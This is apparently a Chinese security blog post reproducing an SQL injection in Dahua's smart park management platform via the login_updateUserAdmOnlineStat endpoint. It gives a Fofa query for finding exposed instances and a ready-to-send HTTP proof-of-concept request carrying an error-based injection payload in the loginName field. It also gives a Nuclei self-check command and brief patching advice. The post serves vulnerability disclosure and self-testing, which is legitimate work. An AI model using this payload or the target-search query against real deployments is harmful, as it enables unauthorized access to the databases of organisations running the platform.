#  漏洞复现｜大华-智慧园区综合管理平台 login_updateUserAdmOnlineStat 存在SQL注入漏洞  
 Poc复现   2026-10-14 09:09  
  
   
  
# 免责声明  
> 「此公众号所分享的网络安全知识、信息及工具皆来源互联网公开收集整理，仅供学习和研究使用，请勿用于非法测试活动。由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，产生的一切后果由读者自行承担，皆与本公众号及文章作者无关、不负任何责任！！！」「如有内容侵权，请联系我们删除处理。谢谢合作！！！」  
  
# 漏洞概述  
> 大华-智慧园区综合管理平台 login_updateUserAdmOnlineStat 存在SQL注入漏洞，攻击者可进行sql注入攻击获取数据库信息或者权限。  
  
# 影响范围  
> dahua-智慧园区综合管理平台  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Qvo4lzibsScwBr1nMjY9fvgCCWkibaehibiby8ibpWHUefAgelpVnn51NwKDAsdxkXAuicIicQzqiaibYGykjGXkVB6iarVeBT5DLqvk7pUzkXTrjYjmw/640?wx_fmt=png&from=appmsg "")  
# 空间测绘  
### Fofa  
```
app="dahua-智慧园区综合管理平台"
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Qvo4lzibsScxDNSwKqrQonZstol08iamgm6RL08yuXkAic5e45OWUIDLGFK4wUx4pZxcUJVfmexxSWMFtdDIibDg0MP2zia4GSrh6lrFLQkKapqU/640?wx_fmt=png&from=appmsg "")  
# 漏洞复现  
#### Poc  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Qvo4lzibsScxFUS4a8YRicsTktqiaO46htgqeiaibJbXtjDS2XPIVKAl21l93HrGesGZLwy6nh2VicdAtCQ7fiaicogHazMQmGfTRanWaHibiaJVGN7pI/640?wx_fmt=png&from=appmsg "")  
```
POST /admin/login_updateUserAdmOnlineStat.action HTTP/1.1Host:127.0.0.1Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Encoding: gzipAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.6,en;q=0.5Connection: keep-aliveContent-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:154.0) Gecko/20100101 Firefox/154.0loginName=1' xor extractvalue(1,concat(0x7e,version(),0x7e)) xor '&isAdmOnline=1
```  
# 漏洞自查  
#### Nuclei  
```
nuclei.exe -u 目标URL -stats -silent -t dahua-smart-park-login-updateuseradmonlinestat-sqli.yaml  
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Qvo4lzibsScwMvk8icnkG3PWlCROfb9fhebsXjWW8f1X6yg8mQYr9EHAlRCeYqXvXrSAQx0A5zDZI0CUgRfgcxYiciaup3yhHXDHXFicnbUxSdVo/640?wx_fmt=png&from=appmsg "")  
# 修复建议  
> • 建议联系厂商打补丁或升级版本。• 增加Web应用防火墙防护。  
  
### poc免费获取  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Qvo4lzibsSczkZTkvTic0wHAUkHvSqncTMibRee6gCy3XWtpnn4IhMicsjRDwa7iazctFGHLN0321cBFzMxTrhVicYeFLlibibyIq2k7jNsAG1IpRuA/640?wx_fmt=jpeg&from=appmsg "")  
  
  
   
  
  
